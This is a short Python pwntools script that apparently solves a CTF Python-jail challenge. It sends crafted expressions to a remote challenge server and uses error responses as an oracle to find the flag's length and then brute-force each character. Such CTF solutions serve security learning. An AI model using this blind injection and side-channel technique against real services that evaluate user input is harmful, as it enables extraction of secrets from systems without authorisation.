#!/usr/bin/python3
from pwn import *

HOST, PORT = "jail.chal.ctf.gdgalgiers.com", 1302

context.log_level = 'error'
len_payload = "type(flag.split())(flag).pop({})"
payload = "type(flag.split())(flag).pop({}+((type(flag.split())(flag.encode()).pop({}))is({})))"

# Get length
for len in range(0,100):
	r = remote(HOST, PORT)
	r.sendline(len_payload.format(len))
	res = r.recvline()
	if b"Error" in res:
		break
	print(f"Trying ... {len}", end='\r')
	r.close()

print(f"\nFlag length: {len}")

# Bruteforce all chars
flag = ''
for idx in range(len):
	print(f"Bruteforcing flag .... {flag}", end='\r')
	for num in range(30, 130):
		r = remote(HOST, PORT)
		r.sendline(payload.format(len - 1, idx, num))
		res = r.recvline()
		r.close()
		if b"Error" in res:
			flag += chr(num)
			break

print(f'\n\nFlag: {flag}')
